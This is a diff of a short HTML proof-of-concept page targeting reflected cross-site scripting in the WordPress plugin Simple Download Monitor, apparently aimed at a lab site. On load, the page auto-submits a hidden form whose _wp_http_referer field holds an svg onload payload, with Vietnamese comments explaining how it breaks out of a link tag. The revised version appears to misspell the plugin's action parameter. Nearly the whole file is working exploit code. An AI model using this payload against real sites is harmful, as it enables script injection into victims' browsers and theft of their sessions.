@@ -1,15 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Downloading...</title>
+  <meta charset="utf-8">
+  <title>SDM XSS PoC</title>
 </head>
 <body>
-    <form id="exploitForm" method="POST" action="https://lab.v1t.site/?sdm_process_download=1">
-        <input type="hidden" name="download_id" value="1" />
-        <input type="hidden" name="_wp_http_referer" value="x><svg/onload=alert(document.domain)>" />
-    </form>
-    <script>
-        document.getElementById('exploitForm').submit();
-    </script>
+  <h1>Testing Reflected XSS in Simple Download Monitor...</h1>
+  <form id="poc" action="https://lab.v1t.site/" method="GET">
+    <!-- Action trigger của plugin -->
+    <input type="hidden" name="smd_process_download" value="1" />
+    
+    <!-- ID thật của Download Item trên lab -->
+    <input type="hidden" name="download_id" value="1649" />
+    
+    <!-- Payload chèn vào _wp_http_referer để break out khỏi thẻ <a> -->
+    <input type="hidden" name="_wp_http_referer" value="x><svg/onload=alert(document.domain)>" />
+  </form>
+
+  <script>
+    document.getElementById('poc').submit();
+  </script>
 </body>
 </html>
